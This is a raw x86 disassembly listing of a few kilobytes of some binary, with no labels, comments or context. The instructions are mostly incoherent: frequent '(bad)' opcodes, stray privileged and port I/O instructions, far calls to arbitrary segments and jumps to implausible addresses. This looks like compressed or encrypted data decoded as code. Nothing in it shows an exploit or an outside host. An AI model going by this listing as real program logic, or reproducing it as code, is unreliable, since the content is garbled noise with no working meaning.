  425dca:	cmp    bh,BYTE PTR [edi]
  425dcc:	cmp    esp,esp
  425dce:	push   edx
  425dcf:	iret   
  425dd0:	into   
  425dd1:	sbb    eax,0xabdd95b1
  425dd6:	dec    ebp
  425dd7:	dec    esp
  425dd8:	div    BYTE PTR [esi]
  425dda:	xchg   BYTE PTR [ecx-0x1e78b7bf],al
  425de0:	call   0x7787fce2
  425de5:	pop    eax
  425de6:	repz push ebx
  425de8:	push   ss
  425de9:	sbb    DWORD PTR [eax+0x5f],ebp
  425dec:	dec    edi
  425ded:	fist   WORD PTR [edi+0x4e]
  425df0:	aam    0xbc
  425df2:	in     eax,0xd4
  425df4:	std    
  425df5:	jmp    0xb054270b
  425dfa:	cmp    ecx,DWORD PTR [ebx+0xc]
  425dfd:	pop    ecx
  425dfe:	sbb    al,0xd6
  425e00:	push   dx
  425e02:	scas   eax,DWORD PTR es:[edi]
  425e03:	push   ebp
  425e04:	mov    BYTE PTR [eax+0x4a],bl
  425e07:	push   es
  425e08:	inc    ebp
  425e09:	mov    cl,0xc7
  425e0b:	and    bl,bl
  425e0d:	call   0x3ad5c0e7
  425e12:	add    eax,0x8a926e38
  425e17:	pop    es
  425e18:	sbb    cl,dl
  425e1a:	(bad)
  425e1d:	push   0xffffff94
  425e1f:	ins    DWORD PTR es:[edi],dx
  425e20:	jg     0x425e57
  425e22:	jecxz  0x425e79
  425e24:	jbe    0x425e47
  425e26:	pop    ebx
  425e27:	fcmovnb st,st(4)
  425e29:	outs   dx,DWORD PTR ds:[esi]
  425e2a:	or     ecx,DWORD PTR [edi-0x79]
  425e2d:	mov    esp,0x5e0644b4
  425e32:	aas    
  425e33:	scas   eax,DWORD PTR es:[edi]
  425e34:	push   0x8e0458e9
  425e39:	sbb    al,0x74
  425e3b:	repnz ins DWORD PTR es:[edi],dx
  425e3d:	pop    esi
  425e3e:	call   DWORD PTR [edx+esi*1]
  425e41:	call   0xcc8e59dc
  425e46:	repnz xor DWORD PTR ds:0x62ed4631,esi
  425e4d:	(bad)  
  425e4e:	fdiv   DWORD PTR [ebp+0x52]
  425e51:	and    DWORD PTR [eax+ebp*8+0x126a5466],eax
  425e58:	shl    DWORD PTR [eax-0x67fdd76f],1
  425e5e:	in     eax,dx
  425e5f:	inc    esi
  425e60:	xchg   ebx,eax
  425e61:	lds    edi,FWORD PTR cs:[ebx+0x5c379e13]
  425e68:	xchg   ecx,eax
  425e69:	add    DWORD PTR [edx],ecx
  425e6b:	les    eax,FWORD PTR [ecx-0x37]
  425e6e:	mov    eax,ds:0xe11e0dfb
  425e73:	retf   
  425e74:	or     DWORD PTR ds:0x799bccc,ecx
  425e7a:	sub    BYTE PTR [eax-0x30a9fc93],al
  425e80:	mov    ds:0x64c84aca,eax
  425e85:	sub    edx,ecx
  425e87:	retf   
  425e88:	(bad)  
  425e89:	pop    edx
  425e8a:	mov    esp,0x24df199d
  425e8f:	push   es
  425e90:	jo     0x425e1f
  425e92:	jo     0x425e6f
  425e94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e95:	push   eax
  425e96:	and    esi,ebx
  425e98:	outs   dx,DWORD PTR ds:[esi]
  425e99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e9a:	mov    eax,ds:0x92c51581
  425e9f:	xchg   BYTE PTR ds:0x9a1bb8c0,bh
  425ea5:	loope  0x425ea0
  425ea7:	mov    esp,0x6810c0b1
  425eac:	imul   edi,ebx,0xeb1846f
  425eb2:	mov    cl,0x4e
  425eb4:	daa    
  425eb5:	sbb    eax,ebp
  425eb7:	push   cs
  425eb8:	add    ebx,0xffffffaf
  425ebb:	pop    ebx
  425ebc:	sar    DWORD PTR [di],cl
  425ebf:	push   es
  425ec0:	cli    
  425ec1:	mov    esp,0x5ec3e7ed
  425ec6:	xchg   esp,eax
  425ec7:	idiv   BYTE PTR [edi+0x1]
  425eca:	push   ds
  425ecb:	retf   0x1878
  425ece:	ds pop edi
  425ed0:	test   BYTE PTR [ebx+0x64],0xe5
  425ed4:	sets   BYTE PTR ds:0x53d262e2
  425edb:	mov    ecx,0xf3cf4518
  425ee0:	add    dl,BYTE PTR [eax+ecx*8+0x7a]
  425ee4:	aam    0x3d
  425ee6:	sub    al,0x96
  425ee8:	jb     0x425eee
  425eea:	mov    esi,ss
  425eec:	loope  0x425f33
  425eee:	jecxz  0x425ead
  425ef0:	and    eax,0x1447a1c1
  425ef5:	push   ebp
  425ef6:	xor    al,0x40
  425ef8:	aam    0x25
  425efa:	stos   DWORD PTR es:[edi],eax
  425efb:	dec    ecx
  425efc:	test   al,0x49
  425efe:	cmp    al,0x0
  425f00:	ss ins BYTE PTR es:[edi],dx
  425f02:	popa   
  425f03:	add    DWORD PTR [ebx+0x320f23c1],edi
  425f09:	cmp    DWORD PTR [ebx],0xcefd1018
  425f0f:	adc    BYTE PTR [ebp+0x64],bh
  425f12:	sbb    dl,bl
  425f14:	sbb    DWORD PTR [edx+0x6e],ecx
  425f17:	and    edx,DWORD PTR fs:0x56c407fc
  425f1e:	test   eax,0x2c4a2234
  425f23:	pop    edi
  425f24:	jp     0x425f57
  425f26:	je     0x425f4b
  425f28:	jae    0x425f3a
  425f2a:	sub    al,0x81
  425f2c:	bound  eax,QWORD PTR [eax-0x6e7b3c0a]
  425f32:	cld    
  425f33:	aaa    
  425f34:	std    
  425f35:	adc    esp,DWORD PTR [ecx+0x53]
  425f38:	fs ret 
  425f3a:	add    BYTE PTR [eax],ah
  425f3c:	cli    
  425f3d:	data16 out dx,al
  425f3f:	fst    QWORD PTR [edx+0x2f]
  425f42:	les    ecx,FWORD PTR [esp+edx*8-0x4c]
  425f46:	mov    al,0xa2
  425f48:	adc    BYTE PTR [edi-0x78],cl
  425f4b:	mov    DWORD PTR [ecx+0x3a],0xb3c760b2
  425f52:	std    
  425f53:	jmp    0x136f710d
  425f58:	pop    ebx
  425f59:	xor    DWORD PTR [edi+0x27],ebx
  425f5c:	or     bh,BYTE PTR [edx-0x5c444bfa]
  425f62:	inc    BYTE PTR [ebx]
  425f64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f65:	inc    edx
  425f66:	pmulhw mm2,mm5
  425f69:	jmp    0x425fb4
  425f6b:	in     eax,0xf8
  425f6d:	sub    eax,0xbfa3c06
  425f72:	ins    BYTE PTR es:[edi],dx
  425f73:	jl     0x425ef9
  425f75:	in     eax,0x58
  425f77:	hlt    
  425f78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f79:	(bad)  
  425f7b:	iret   
  425f7c:	xchg   esi,eax
  425f7d:	inc    eax
  425f7e:	int    0x12
  425f80:	mov    dh,0x25
  425f82:	xor    DWORD PTR [ebx],0x5f008458
  425f88:	xor    al,0xcc
  425f8a:	(bad)  
  425f8b:	int    0xc0
  425f8d:	inc    ebp
  425f8e:	loop   0x425fdf
  425f90:	sub    ah,BYTE PTR fs:[esi+0x5f]
  425f94:	aam    0xd6
  425f96:	(bad)  
  425f97:	shr    ebp,1
  425f99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f9a:	fwait
  425f9b:	in     al,0x9c
  425f9d:	cmp    DWORD PTR [ebx],esi
  425f9f:	xchg   DWORD PTR [esi-0x66],edi
  425fa2:	mov    ah,0x3
  425fa4:	pop    ecx
  425fa5:	mov    bl,0xd0
  425fa7:	enter  0x3eeb,0x37
  425fab:	iret   
  425fac:	fxch   st(3)
  425fae:	cmp    esi,ebp
  425fb0:	push   cs
  425fb1:	mov    ds:0xa93cfdd1,eax
  425fb6:	add    al,0xc1
  425fb8:	sbb    dh,BYTE PTR [ebx-0x24e2d58b]
  425fbe:	push   0x8d9af1
  425fc3:	fistp  DWORD PTR [ecx]
  425fc5:	pop    ds
  425fc6:	outs   dx,BYTE PTR ds:[esi]
  425fc7:	push   ebx
  425fc8:	rcr    BYTE PTR [ebx-0x33],0x44
  425fcc:	mov    ah,0x93
  425fce:	cmp    BYTE PTR [ebp-0x5d55e2a7],dh
  425fd4:	scas   al,BYTE PTR es:[edi]
  425fd5:	sub    eax,0xe00ea08d
  425fda:	or     eax,ebx
  425fdc:	sbb    edx,edi
  425fde:	push   ecx
  425fdf:	cmp    DWORD PTR [edi],ebp
  425fe1:	aas    
  425fe2:	lea    ecx,[edx-0x59caa02f]
  425fe8:	mov    DWORD PTR [edi+0x1b],ebx
  425feb:	fmul   st,st(6)
  425fed:	adc    al,0x5
  425fef:	or     esp,DWORD PTR ds:0xe4a5d835
  425ff5:	fistp  DWORD PTR [edi+0x5c0513f2]
  425ffb:	xchg   edx,eax
  425ffc:	enter  0x6040,0xd3
  426000:	call   0xafbd:0x4816766
  426007:	xchg   ebp,eax
  426008:	jno    0x426074
  42600a:	in     al,dx
  42600b:	scas   al,BYTE PTR es:[edi]
  42600c:	sti    
  42600d:	pop    esp
  42600e:	ja     0x425f9f
  426010:	sbb    BYTE PTR [edi],dl
  426012:	or     edx,DWORD PTR [eax-0x24]
  426015:	sbb    DWORD PTR [edi+0x46d8a6f8],ecx
  42601b:	and    al,0x45
  42601d:	ss and ebx,esi
  426020:	js     0x426056
  426022:	rcl    DWORD PTR [ebp+0x32],1
  426025:	in     al,dx
  426026:	stc    
  426027:	inc    esi
  426028:	push   ebp
  426029:	fist   WORD PTR [edx+0xe]
  42602c:	xor    BYTE PTR [ebx],ah
  42602e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42602f:	add    esp,edx
  426031:	pop    esi
  426032:	ret    
  426033:	popa   
  426034:	arpl   dx,sp
  426036:	sbb    al,0x46
  426038:	and    al,0xe7
  42603a:	ret    
  42603b:	add    DWORD PTR [esi-0x52a6b2ce],eax
  426041:	cmp    bh,BYTE PTR [edi]
  426043:	inc    edi
  426044:	push   ss
  426045:	pop    ecx
  426046:	dec    edi
  426047:	enter  0x29f7,0x81
  42604b:	imul   edx,esi,0x79af0bd4
  426051:	mov    eax,ds:0xac3da94e
  426056:	sbb    bl,al
  426058:	retf   
  426059:	ds (bad) 
  42605b:	mov    dl,0x1b
  42605d:	shr    BYTE PTR [edi],0x1b
  426060:	sub    eax,0xbcaff567
  426065:	push   0xffffffcf
  426067:	test   eax,0x61f825a3
  42606c:	jle    0x426026
  42606e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42606f:	cmp    al,0x3e
  426071:	fst    QWORD PTR [eax+0xc]
  426074:	fidivr DWORD PTR [ecx+esi*8-0x46]
  426078:	mov    ds:0xad1fed88,al
  42607d:	int    0x4a
  42607f:	ins    DWORD PTR es:[edi],dx
  426080:	xlat   BYTE PTR ds:[ebx]
  426081:	pop    edi
  426082:	(bad)  
  426083:	inc    ebp
  426084:	rcr    dl,0x70
  426087:	repz addr16 push esp
  42608a:	xor    al,cl
  42608c:	adc    bl,BYTE PTR [esi]
  42608e:	sahf   
  42608f:	push   ds
  426090:	cmp    esi,DWORD PTR [eax+0xb]
  426093:	hlt    
  426094:	jge    0x4260c4
  426096:	push   ss
  426097:	sahf   
  426098:	aas    
  426099:	cmp    al,0xf8
  42609b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42609c:	fldenv [ebp-0x4256e4e0]
  4260a2:	lock cmp ecx,DWORD PTR [ebx-0x31]
  4260a6:	xor    DWORD PTR [esi-0x1f],ecx
  4260a9:	ror    DWORD PTR ds:0xf60a59cc,0xc7
  4260b0:	mov    edx,0x204e8af7
  4260b5:	mov    edx,DWORD PTR ds:0x4e3f9869
  4260bb:	push   edx
  4260bc:	or     bh,BYTE PTR [eax-0x4c2bd180]
  4260c2:	sbb    BYTE PTR ds:0xb124a18b,dh
  4260c8:	retf   
  4260c9:	jmp    0x55ff4186
  4260ce:	lahf   
  4260cf:	test   DWORD PTR [ecx+0x3b62c064],ebp
	...
  4260e1:	sbb    ch,al
  4260e3:	mov    ebx,esp
  4260e5:	sti    
  4260e6:	call   FWORD PTR [edi-0x12]
  4260e9:	dec    edx
  4260ea:	pop    esi
  4260eb:	popa   
  4260ec:	sub    ebp,edi
  4260ee:	cwde   
  4260ef:	scas   al,BYTE PTR es:[edi]
  4260f0:	sub    ebp,DWORD PTR [ecx-0x53fffe29]
  4260f6:	add    eax,DWORD PTR [eax]
  4260f8:	add    BYTE PTR [ebx],bl
  4260fa:	dec    ebp
  4260fb:	push   ebp
  4260fc:	(bad)  
  4260fd:	cmp    eax,0x20c0e209
  426102:	ror    BYTE PTR [esi],cl
  426104:	xor    cl,al
  426106:	call   0xdd73:0xe2a307f4
  42610d:	retf   
  42610e:	push   esp
  42610f:	mov    ch,0xed
  426111:	scas   eax,DWORD PTR es:[edi]
  426112:	test   eax,0x3bd0a702
  426117:	(bad)  
  426118:	pop    ds
  426119:	fsubr  QWORD PTR [ecx-0x4dfc2088]
  42611f:	sahf   
  426120:	enter  0xa93f,0x77
  426124:	sub    eax,0x54f81fc4
  426129:	bound  edx,QWORD PTR [eax+0x6b]
  42612c:	fxch   st(5)
  42612e:	fidiv  WORD PTR [esi+0x2587abff]
  426134:	data16 js 0x42616d
  426137:	jge    0x42615e
  426139:	int3   
  42613a:	xor    al,0x33
  42613c:	das    
  42613d:	cmp    edx,0xb5a519bf
  426143:	out    0xd8,eax
  426145:	cmc    
  426146:	jge    0x42616d
  426148:	fwait
  426149:	push   ebx
  42614a:	adc    al,0x5a
  42614c:	xor    al,0x97
  42614e:	outs   dx,BYTE PTR ds:[esi]
  42614f:	xchg   esi,eax
  426150:	mov    ds:0xd6d6cf4d,eax
  426155:	(bad)  
  426156:	outs   dx,BYTE PTR ds:[esi]
  426157:	or     ah,BYTE PTR [ebx]
  426159:	mov    al,0x25
  42615b:	pushf  
  42615c:	lods   eax,DWORD PTR ds:[esi]
  42615d:	out    dx,al
  42615e:	cmp    DWORD PTR [ecx],edi
  426160:	push   0x51
  426162:	shl    DWORD PTR [eax+0x0],0x60
  426166:	xor    eax,0x564f354b
  42616b:	hlt    
  42616c:	es mov bh,0x45
  42616f:	add    esi,DWORD PTR [edx+eax*1+0x32]
  426173:	les    edx,FWORD PTR [edx]
  426175:	rcr    DWORD PTR [ecx],1
  426177:	stos   BYTE PTR es:[edi],al
  426178:	pop    ebp
  426179:	ja     0x4261d0
  42617b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42617c:	arpl   cx,cx
  42617e:	test   BYTE PTR [edx+0x2d],dl
  426181:	sub    bl,ah
  426183:	jmp    0x962e:0xf9cd87f2
  42618a:	fsubr  QWORD PTR [edi+0x34f15320]
  426190:	shr    al,1
  426192:	out    0x34,eax
  426194:	inc    ebp
  426195:	outs   dx,BYTE PTR ds:[esi]
  426196:	call   0xf075abcf
  42619b:	pop    esp
  42619c:	jnp    0x426164
  42619e:	push   edx
  42619f:	out    0xab,al
  4261a1:	add    al,0xd6
  4261a3:	(bad)  
  4261a4:	cli    
  4261a5:	imul   edx,DWORD PTR [eax+0x57],0xffffffdb
  4261a9:	add    cl,BYTE PTR [eax+0x37]
  4261ac:	xor    DWORD PTR [ecx-0x6a5ba39b],ebp
  4261b2:	sar    DWORD PTR [esi+0x34e43f0c],0xd5
  4261b9:	add    ch,bh
  4261bb:	xchg   esi,eax
  4261bc:	or     cl,BYTE PTR [edx]
  4261be:	fild   WORD PTR [eax-0x25778f89]
  4261c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4261c5:	or     al,0xc
  4261c7:	pop    esi
  4261c8:	(bad)  
  4261c9:	pop    ecx
  4261ca:	dec    DWORD PTR [esi]
  4261cc:	mov    bl,BYTE PTR ds:0xf85b986d
  4261d2:	das    
  4261d3:	mov    ds:0x6a3f1e15,eax
  4261d8:	jno    0x426218
  4261da:	fist   DWORD PTR ss:[edx-0x6c]
  4261de:	push   eax
  4261df:	test   al,0x66
  4261e1:	xchg   BYTE PTR [eax-0x54],al
  4261e4:	mov    bh,0x2e
  4261e6:	and    al,0xcd
  4261e8:	jns    0x426189
  4261ea:	ret    
  4261eb:	(bad)  
  4261ec:	pop    edi
  4261ed:	test   DWORD PTR [esi+esi*4],edi
  4261f0:	in     al,dx
  4261f1:	inc    edx
  4261f2:	leave  
  4261f3:	lods   eax,DWORD PTR ds:[esi]
  4261f4:	push   ecx
  4261f5:	jne    0x4261aa
  4261f7:	xor    al,0xba
  4261f9:	call   0x47d9:0x4d2e7141
  426200:	xchg   BYTE PTR [ecx+0x74],bh
  426203:	int    0x52
  426205:	in     eax,dx
  426206:	push   ebx
  426207:	fidiv  WORD PTR [esi-0x5f4ff88d]
  42620d:	imul   ecx,DWORD PTR [ebx-0x173f84c6],0x5bc8def9
  426217:	add    cl,BYTE PTR [ebx]
  426219:	stos   DWORD PTR es:[edi],eax
  42621a:	retf   0x9046
  42621d:	push   0xaedd559f
  426222:	jo     0x42622b
  426224:	sbb    edx,esi
  426226:	fbld   TBYTE PTR [edi]
  426228:	dec    ebp
  426229:	and    bh,BYTE PTR [esi-0x263401e3]
  42622f:	out    0x3,eax
  426231:	push   cs
  426232:	sahf   
  426233:	inc    esp
  426234:	xlat   BYTE PTR ds:[ebx]
  426235:	jae    0x4262b2
  426237:	add    BYTE PTR [edi+0x6f],al
  42623a:	mov    edi,0x6fa0a076
  42623f:	retf   
  426240:	jbe    0x426226
  426242:	out    dx,eax
  426243:	out    dx,eax
  426244:	dec    eax
  426245:	imul   BYTE PTR [eax+0x36fbfc03]
  42624b:	mov    ah,BYTE PTR [ecx]
  42624d:	ficom  WORD PTR [edi+0x5f8da7d3]
  426253:	lods   al,BYTE PTR ds:[esi]
  426254:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426255:	test   al,0xd
  426257:	out    dx,al
  426258:	loopne 0x4261f7
  42625a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42625b:	cld    
  42625c:	jbe    0x426255
  42625e:	mov    ebx,0x1b1d4e32
  426263:	stos   DWORD PTR es:[edi],eax
  426264:	rcr    al,0x3b
  426267:	mov    bh,0xac
  426269:	push   esi
  42626a:	mov    eax,ds:0x5b1fda45
  42626f:	cmp    al,0x39
  426271:	fs inc edi
  426273:	aaa    
  426274:	mov    WORD PTR [edx],es
  426276:	shl    DWORD PTR [ebx],cl
  426278:	(bad)  
  426279:	fsubr  DWORD PTR [ebp+0x14]
  42627c:	add    al,dl
  42627e:	cdq    
  42627f:	jns    0x42624a
  426281:	jge    0x4262e9
  426283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426284:	into   
  426285:	mov    eax,edx
  426287:	shl    DWORD PTR es:[ebp+0x78376d9b],cl
  42628e:	jge    0x42626d
  426290:	scas   eax,DWORD PTR es:[edi]
  426291:	mov    ch,0xbf
  426293:	dec    edi
  426294:	rcl    DWORD PTR [esi],1
  426296:	push   cs
  426297:	mov    DWORD PTR [edx-0xb43f29a],edi
  42629d:	and    BYTE PTR [edi],cl
  42629f:	pop    ebx
  4262a0:	test   eax,0x30f90d96
  4262a5:	pop    edi
  4262a6:	sbb    ecx,ebp
  4262a8:	and    ah,BYTE PTR [ecx]
  4262aa:	mov    ds:0x9ac98fa0,al
  4262af:	xchg   ecx,eax
  4262b0:	sbb    ecx,DWORD PTR [edx+0x28041edb]
  4262b6:	(bad)  
  4262b8:	jnp    0x42627b
  4262ba:	push   edx
  4262bb:	int3   
  4262bc:	pop    edi
  4262bd:	pop    es
  4262be:	sbb    BYTE PTR [eax],al
  4262c0:	mov    eax,ds:0xdd2f6d9f
  4262c5:	pop    esi
  4262c6:	add    eax,0x571aa7a
  4262cb:	leave  
  4262cc:	sub    DWORD PTR [edx-0x314a72f9],0x3a4780db
  4262d6:	imul   ebx,ebx,0x62
  4262d9:	mov    cl,0x6a
  4262db:	cmc    
  4262dc:	jp     0x4262ee
  4262de:	ins    BYTE PTR es:[edi],dx
  4262df:	mov    al,BYTE PTR [ecx+eiz*4]
  4262e2:	jns    0x426299
  4262e4:	loopne 0x426333
  4262e6:	jmp    0x5323db8f
  4262eb:	cmp    eax,0x443c7949
  4262f0:	lgs    esp,FWORD PTR [eax-0x6c9cbd3a]
  4262f7:	sub    eax,0x4bbf44b
  4262fc:	xchg   esp,eax
  4262fd:	mov    ds:0xfa7085d1,al
  426302:	cs ret 
  426304:	loopne 0x4262e9
  426306:	pop    ss
  426307:	cmp    DWORD PTR [ecx],0x4e
  42630a:	mov    ds:0x38e2135b,al
  42630f:	mov    ss,WORD PTR [ebx+0x59bd8b7b]
  426315:	mov    bh,0x77
  426317:	xor    DWORD PTR [ecx-0x7b407721],0x7f
  42631e:	les    eax,FWORD PTR [edi+ebp*8-0x51]
  426322:	lods   al,BYTE PTR ds:[esi]
  426323:	xchg   esp,eax
  426324:	mov    DWORD PTR [ebx-0x32],esp
  426327:	stc    
  426328:	shl    DWORD PTR [ebp+0x29],cl
  42632b:	test   eax,0xc0de196e
  426330:	in     eax,0xc8
  426332:	xor    al,0x58
  426334:	xor    DWORD PTR [eax-0x46396271],ecx
  42633a:	mov    BYTE PTR [ecx],bl
  42633c:	ret    
  42633d:	popa   
  42633e:	inc    edx
  42633f:	daa    
  426340:	add    al,0xf
  426342:	jl     0x42633b
  426344:	or     al,0x53
  426346:	xchg   esi,eax
  426347:	cwde   
  426348:	or     BYTE PTR [eax],bl
  42634a:	dec    eax
  42634b:	add    DWORD PTR [edx+eiz*2],edx
  42634e:	scas   eax,DWORD PTR es:[edi]
  42634f:	ror    bh,cl
  426351:	pop    esp
  426352:	int    0x7
  426354:	int3   
  426355:	mov    dh,0xcf
  426357:	ds pop esp
  426359:	ret    
  42635a:	adc    eax,0xf8ecc451
  42635f:	xor    BYTE PTR [ebp+esi*1-0x4],dh
  426363:	lods   al,BYTE PTR ds:[esi]
  426364:	call   0x438a:0x439658f
  42636b:	test   BYTE PTR [ebp+0x46],cl
  42636e:	out    0xd9,eax
  426370:	mov    ds:0xd2df8692,eax
  426375:	jbe    0x4263ca
  426377:	aas    
  426378:	mov    dh,BYTE PTR [edx+0x19]
  42637b:	jge    0x4263e0
  42637d:	(bad)  
  42637e:	pop    ebx
  42637f:	repz fmul QWORD PTR [edi+0x40]
  426383:	call   0xdf0:0xac5262af
  42638a:	fbld   TBYTE PTR [eax-0x63]
  42638d:	scas   al,BYTE PTR es:[edi]
  42638e:	loop   0x426402
  426390:	cld    
  426391:	in     eax,dx
  426392:	pop    edi
  426393:	(bad)  
  426394:	popa   
  426395:	int    0x7b
  426397:	fistp  DWORD PTR [ebp-0x4420002b]
  42639d:	push   ss
  42639e:	adc    DWORD PTR [edi],0x1b186d00
  4263a4:	push   es
  4263a5:	ret    0x17c9
  4263a8:	cmp    al,0x19
  4263aa:	cli    
  4263ab:	jnp    0x426389
  4263ad:	xrelease mov BYTE PTR [edx-0x4a4f148b],0x60
  4263b5:	jo     0x426383
  4263b7:	sub    ebx,ebx
  4263b9:	adc    BYTE PTR [ecx],0xe6
  4263bc:	ret    0x8f50
  4263bf:	and    dh,BYTE PTR [ebp+ebx*8+0x37]
  4263c3:	add    ebx,ebp
  4263c5:	push   es
  4263c6:	dec    edx
  4263c7:	mov    DWORD PTR [ebp+0x47],esp
  4263ca:	mov    ah,0xcc
  4263cc:	out    dx,al
  4263cd:	das    
  4263ce:	in     al,0xc6
  4263d0:	add    BYTE PTR [ecx-0x799ff28],dl
  4263d6:	cmp    eax,0xe3197ea9
  4263db:	shl    DWORD PTR [ebp+0x7f],1
  4263de:	stos   DWORD PTR es:[edi],eax
  4263df:	mov    dh,0x6
  4263e1:	sub    DWORD PTR ds:0x29cc7e3e,ebx
  4263e7:	daa    
  4263e8:	(bad)  
  4263e9:	sub    ebp,DWORD PTR [esi+0x55]
  4263ec:	and    DWORD PTR [eax+0x2db8b890],ebx
  4263f2:	outs   dx,BYTE PTR ds:[esi]
  4263f3:	and    eax,0xdb8a5ffc
  4263f8:	push   ss
  4263f9:	mov    dh,0x23
  4263fb:	jne    0x426464
  4263fd:	adc    eax,0x5c90bd6
  426402:	mov    eax,ds:0x8ab4f1a2
  426407:	stos   DWORD PTR es:[edi],eax
  426408:	int3   
  426409:	fsubp  st(1),st
  42640b:	rcr    ch,0xe3
  42640e:	or     dl,cl
  426410:	call   0xe399:0x617a3460
  426417:	jnp    0x4263d2
  426419:	shl    BYTE PTR [edx+0x6358db0a],1
  42641f:	div    DWORD PTR [ebx-0x97ed985]
  426425:	clc    
  426426:	mov    dl,BYTE PTR [edx+0x53]
  426429:	rdseed esi
  42642c:	aam    0xb8
  42642e:	loop   0x4263f5
  426430:	mov    edx,0xd0343ff0
  426435:	mov    WORD PTR [eax-0x33],ds
  426438:	xor    ebx,ecx
  42643a:	dec    eax
  42643b:	sbb    eax,0x228b76d9
  426440:	popa   
  426441:	sti    
  426442:	pop    eax
  426443:	and    edx,DWORD PTR [esp+eiz*8+0x23]
  426447:	mov    ds:0x98ca14bc,al
  42644c:	retf   
  42644d:	or     eax,0x4d793ad5
  426452:	cmp    DWORD PTR [esi-0x54],ebp
  426455:	jmp    0x4264a0
  426457:	and    DWORD PTR [esp+edi*8-0x1c4c73eb],edx
  42645e:	mov    dh,0xe8
  426460:	and    dl,BYTE PTR ds:0x3099a422
  426466:	loop   0x426468
  426468:	aas    
  426469:	scas   al,BYTE PTR es:[edi]
  42646a:	lahf   
  42646b:	data16 sahf 
  42646d:	inc    ebx
  42646e:	sub    al,0xde
  426470:	scas   eax,DWORD PTR es:[edi]
  426471:	(bad)  
  426472:	mov    ch,0x62
  426474:	fistp  DWORD PTR [ebp-0x494949b8]
  42647a:	mov    ds:0x6533550c,eax
  42647f:	call   0x9ba0ab47
  426484:	jecxz  0x4264e5
  426486:	cdq    
  426487:	pop    es
  426488:	das    
  426489:	fld    TBYTE PTR [ecx]
  42648b:	call   0x7f46:0xc0724f38
  426492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426493:	js     0x426443
  426495:	mov    dh,0x24
  426497:	or     BYTE PTR [eax-0x66506720],ch
  42649d:	add    ebp,DWORD PTR [ebp-0x67ddb82b]
  4264a3:	push   0xb9
	...
  4264b0:	add    dl,ah
  4264b2:	jnp    0x426505
  4264b4:	data16 fldcw WORD PTR [esi-0x9]
  4264b8:	dec    DWORD PTR [eax+0x6f]
  4264bb:	std    
  4264bc:	or     ecx,DWORD PTR [ebp+0x2a]
  4264bf:	mov    edx,0x1db55c8
  4264c4:	add    BYTE PTR [ebx+eax*1-0x31ec0000],ch
  4264cb:	test   DWORD PTR [ebx+0x0],0x31dc0a68
  4264d2:	outs   dx,BYTE PTR ds:[esi]
  4264d3:	ins    BYTE PTR es:[edi],dx
  4264d4:	fstp   DWORD PTR [edx+0x5f352eba]
  4264da:	popf   
  4264db:	jae    0x42645d
  4264dd:	xor    edi,DWORD PTR [esi+eiz*8-0x26dd9a81]
  4264e4:	or     eax,0x342bf94f
  4264e9:	(bad)  
  4264ea:	push   ds
  4264eb:	xor    DWORD PTR [ebp-0x471bdd96],ebp
  4264f1:	cmp    DWORD PTR [ebx+esi*1+0x76f8e35a],edx
  4264f8:	pop    ebx
  4264f9:	push   0x6f
  4264fb:	jge    0x426517
  4264fd:	fnstenv [edx-0x9]
  426500:	add    ah,BYTE PTR [ecx-0x51]
  426503:	test   BYTE PTR [esi-0x2deaeb10],ch
  426509:	adc    DWORD PTR ds:0xa2c373a1,esp
  42650f:	push   es
  426510:	pop    ebp
  426511:	scas   eax,DWORD PTR es:[edi]
  426512:	stos   BYTE PTR es:[edi],al
  426513:	scas   eax,DWORD PTR es:[edi]
  426514:	add    bl,BYTE PTR [edi-0x26]
  426517:	pusha  
  426518:	xlat   BYTE PTR ds:[ebx]
  426519:	das    
  42651a:	or     eax,0xbc291a82
  42651f:	and    cl,BYTE PTR [edi]
  426521:	cs cmc 
  426523:	clc    
  426524:	icebp  
  426525:	adc    DWORD PTR [edx+eiz*8-0x5793a54d],eax
  42652c:	add    bh,cl
  42652e:	mov    ss,WORD PTR [edx+edx*4]
  426531:	leave  
  426532:	test   DWORD PTR [eax-0x62],eax
  426535:	cmp    DWORD PTR ds:0x72673a9b,0xb831e1d8
  42653f:	cli    
  426540:	lock in eax,dx
  426542:	fwait
  426543:	push   edx
  426544:	int3   
  426545:	test   BYTE PTR [ebx+0x6c],al
  426548:	ds out 0xfc,eax
  42654b:	fwait
  42654c:	in     al,dx
  42654d:	in     eax,0xc6
  42654f:	sub    al,0x80
  426551:	dec    esp
  426552:	pop    esi
  426553:	push   edx
  426554:	test   DWORD PTR [ebx],0x908b99d0
  42655a:	(bad)  
  42655b:	lahf   
  42655c:	mov    eax,0xf7394542
  426561:	jecxz  0x426518
  426563:	jmp    0x4265c7
  426565:	fimul  WORD PTR [ebx-0x4d]
  426568:	pop    esp
  426569:	xor    eax,0x746a24da
  42656e:	test   al,0xe7
  426570:	dec    ecx
  426571:	dec    esi
  426572:	pop    edi
  426573:	pop    edx
  426574:	stos   BYTE PTR es:[edi],al
  426575:	or     ecx,DWORD PTR [edx+0xec2c244]
  42657b:	xor    edx,DWORD PTR [ecx+0x73d98f54]
  426581:	push   0x66dd558b
  426586:	adc    al,0x2e
  426588:	sub    eax,0xb9709dd4
  42658d:	ins    BYTE PTR es:[edi],dx
  42658e:	pop    ss
  42658f:	mov    ds:0xa4bef8e4,eax
  426594:	aaa    
  426595:	rcl    BYTE PTR [esi-0x2a],1
  426598:	gs mov ah,0x6f
  42659b:	mov    edi,0x378dcbd
  4265a0:	dec    eax
  4265a1:	ret    0xe993
  4265a4:	mov    eax,0xb86a8af6
  4265a9:	ret    
  4265aa:	add    ebx,esi
  4265ac:	test   al,0x6d
  4265ae:	dec    esp
  4265af:	or     eax,edi
  4265b1:	cmp    eax,0x9271e035
  4265b6:	cli    
  4265b7:	mov    ebp,0x442a3cfe
